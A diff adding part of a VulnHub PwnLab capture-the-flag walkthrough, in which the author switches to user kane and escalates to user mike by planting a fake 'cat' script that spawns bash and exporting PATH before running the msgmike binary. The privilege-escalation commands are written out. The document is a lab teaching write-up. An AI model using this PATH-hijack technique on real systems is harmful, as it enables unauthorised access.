@@ -232,4 +232,39 @@ and we get the shell :
 
 ![revshell2](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f79411f2-5ab7-4e8c-9fe2-60124cf51c4d)
 
+now that we are in the machine try to login with another user we already found in the database for example `kane`
+
+```text
+root@kali~# su kane
+```
+
+`notice that you can not login with `mike` with the password found in the database.`
+
+naviage to home page and kane directory :
+
+![kane](https://github.com/Git-K3rnel/VulnHub/assets/127470407/a3e83bd2-6cd4-4a60-9e69-7ca3eb4ab3c4)
+
+and run the `msgmike`, you will get the error :
+
+```text
+cat: /home/mike/msg.txt: No such file or directory
+```
+
+see the strings of this binary :
+
+![strings](https://github.com/Git-K3rnel/VulnHub/assets/127470407/518e6018-81d1-4a9c-9d55-381260943f79)
+
+yes, the binary is using `cat` without absolute path, so we can exploit this :
+
+```text
+kane@pwnlab:~$ echo '#!/bin/bash' > cat
+kane@pwnlab:~$ echo '/bin/bash' >> cat
+kane@pwnlab:~$ chmod 777 cat
+kane@pwnlab:~$ export PATH=$PWD
+kane@pwnlab:~$ ./msgmike
+```
+
+![cat](https://github.com/Git-K3rnel/VulnHub/assets/127470407/117f88cc-1be9-4278-91fb-19751b4cf7a8)
+
+now you are use mike
 
